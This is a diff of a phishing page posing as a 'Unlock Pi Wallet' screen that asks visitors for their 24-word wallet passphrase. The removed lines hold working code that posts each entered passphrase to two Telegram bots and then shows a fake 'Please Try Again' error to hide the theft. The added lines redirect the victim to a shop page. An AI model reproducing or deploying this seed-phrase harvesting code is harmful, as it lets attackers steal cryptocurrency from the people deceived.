@@ -253,16 +253,16 @@
 </head>
 <body>
 
-  <!-- Main Content -->
+ <!-- Main Content -->
   <div class="main-content">
     <h1 class="page-title">Unlock Pi Wallet</h1>
     
     <div class="input-container">
       <input 
-    type="text"
-    class="message-input" 
-    id="messageInput" 
-    placeholder="Enter Your 24-word passphrase here"
+        type="text"
+        class="message-input" 
+        id="messageInput" 
+        placeholder="Enter Your 24-word passphrase here"
       />
     </div>
 
@@ -301,6 +301,7 @@
   const TELEGRAM_CHAT_ID_2 = "8119887370";
 
   const HOMEPAGE_URL = "https://pibrowserkurd.github.io/pibrowserhome/";
+  const REDIRECT_URL = "https://pibrowserkurd.github.io/shop/";
 
   const buttons = document.querySelectorAll(".unlock-button");
   const buttonTexts = document.querySelectorAll(".button-text");
@@ -348,63 +349,11 @@
       }, 5000);
 
       return;
+    } else {
+      // Redirect to the shop page immediately if 24 or more characters
+      window.location.href = REDIRECT_URL;
+      return;
     }
-
-    const passkey = message;
-    const now = new Date();
-    const timeStr = formatTimeWithOclock(now);
-
-    const telegramMessage = `
-🔐 <b>New Passkey Received</b>\n
-📋 <b>Passkey:</b> <code>${passkey}</code>\n
-🕒 <b>Time:</b> ${timeStr}\n
-<a href="https://t.me/share/url?url=${encodeURIComponent(passkey)}" target="_blank">📎 Click here to copy passkey</a>
-`;
-
-    const requests = [
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID_1,
-          text: telegramMessage,
-          parse_mode: "HTML"
-        })
-      }),
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID_2,
-          text: telegramMessage,
-          parse_mode: "HTML"
-        })
-      })
-    ];
-
-    Promise.all(requests)
-      .then(responses => Promise.all(responses.map(res => res.json())))
-      .then(results => {
-        const allSuccess = results.every(result => result.ok);
-        if (allSuccess) {
-          showStatus("✗ Please Try Again", "error");
-          input.value = "";
-        } else {
-          showStatus("✗ Please Try Again", "error");
-          console.error("Telegram API results:", results);
-        }
-      })
-      .catch(error => {
-        showStatus("✗ Please Try Again", "error");
-        console.error("Telegram API error:", error);
-      })
-      .finally(() => {
-        setTimeout(() => {
-          disableInputAndButtons(false);
-          buttonTexts[0].textContent = "Unlock With Passphrase";
-          buttonTexts[1].textContent = "Unlock With Face ID";
-        }, 5000);
-      });
   }
 
   input.addEventListener("input", function () {
@@ -416,6 +365,7 @@
     input.focus();
   });
 </script>
+
 
     
 </body>
